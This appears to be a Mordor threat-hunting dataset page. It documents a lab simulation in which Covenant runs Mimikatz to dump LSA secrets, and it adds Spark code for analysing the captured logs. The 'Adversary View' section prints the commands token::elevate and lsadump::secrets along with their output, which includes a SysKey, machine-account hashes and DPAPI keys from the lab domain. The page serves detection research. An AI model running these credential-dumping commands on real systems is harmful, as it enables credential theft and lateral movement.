# Covenant Mimikatz LSA Secrets

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-191205043410 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/12/05 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Covenant |
| Simulation Script | https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_lsasecrets.tar.gz |

## Dataset Description
This dataset represents adversaries using Mimikatz to get the SysKey to decrypt SECRETS entries (from registry or hives).

## Adversary View
```
.#####.   mimikatz 2.2.0 (x64) #18362 Oct  8 2019 14:30:39
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

760	{0;000003e7} 1 D 26049     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
  -> Impersonated !
  * Process Token : {0;000764fd} 1 F 7191206   	shire\pgustavo	S-1-5-21-791464340-1796667228-2788435825-1112	(17g,24p)	Primary
  * Thread Token  : {0;000003e7} 1 D 8539221   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(powershell) # lsadump::secrets
Domain : IT001
SysKey : 4723683e5d919d0170ffd5a4c2b137fa

Local name : IT001 ( S-1-5-21-2036226717-1704707055-511440364 )
Domain name : shire ( S-1-5-21-791464340-1796667228-2788435825 )
Domain FQDN : shire.com

Policy subsystem is : 1.18
LSA Key(s) : 1, default {8b36cbca-d3e7-f8bc-d903-ff9728f21c92}
  [00] {8b36cbca-d3e7-f8bc-d903-ff9728f21c92} db4d026436543ae43b751a1085e7dbe6e560be5dc2ed67e326aefb1c79127025

Secret  : $MACHINE.ACC
cur/text: _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
    NTLM:91bf84541aee793f0306edfb1481385f
    SHA1:9a3197038ac98c4d67f513f5ffe0a421a668c433
old/text: _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
    NTLM:91bf84541aee793f0306edfb1481385f
    SHA1:9a3197038ac98c4d67f513f5ffe0a421a668c433

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 a3 4a 0b a5 9b df d8 b8 b0 48 ad cb 01 e0 6f 6c a7 ed ff a8 5c 5c ae a1 03 63 5c 53 97 cd 54 e5 ee 16 2e 66 0f d8 aa f7 
    full: a34a0ba59bdfd8b8b048adcb01e06f6ca7edffa85c5caea103635c5397cd54e5ee162e660fd8aaf7
    m/u : a34a0ba59bdfd8b8b048adcb01e06f6ca7edffa8 / 5c5caea103635c5397cd54e5ee162e660fd8aaf7
old/hex : 01 00 00 00 e0 3e d2 d5 93 e9 84 cf a6 87 0f 0e 00 4c af fa 69 7b 54 31 a9 d4 a5 12 ae e3 26 c5 e3 a3 33 30 f5 d6 e4 da 8e a5 dc 1d 
    full: e03ed2d593e984cfa6870f0e004caffa697b5431a9d4a512aee326c5e3a33330f5d6e4da8ea5dc1d
    m/u : e03ed2d593e984cfa6870f0e004caffa697b5431 / a9d4a512aee326c5e3a33330f5d6e4da8ea5dc1d

Secret  : NL$KM
cur/hex : d8 62 8d 69 1d 58 75 3c 25 bd d2 c8 69 d1 54 73 37 9e f7 56 c6 61 81 9a 2f 83 1e b1 5e e8 d7 4f 1f 01 86 f1 15 70 e5 0a 8a 49 9a bf b9 4c 88 b6 b9 a2 62 85 cc 08 29 34 31 2b e9 27 59 af 93 18 
old/hex : d8 62 8d 69 1d 58 75 3c 25 bd d2 c8 69 d1 54 73 37 9e f7 56 c6 61 81 9a 2f 83 1e b1 5e e8 d7 4f 1f 01 86 f1 15 70 e5 0a 8a 49 9a bf b9 4c 88 b6 b9 a2 62 85 cc 08 29 34 31 2b e9 27 59 af 93 18
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_lsasecrets.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        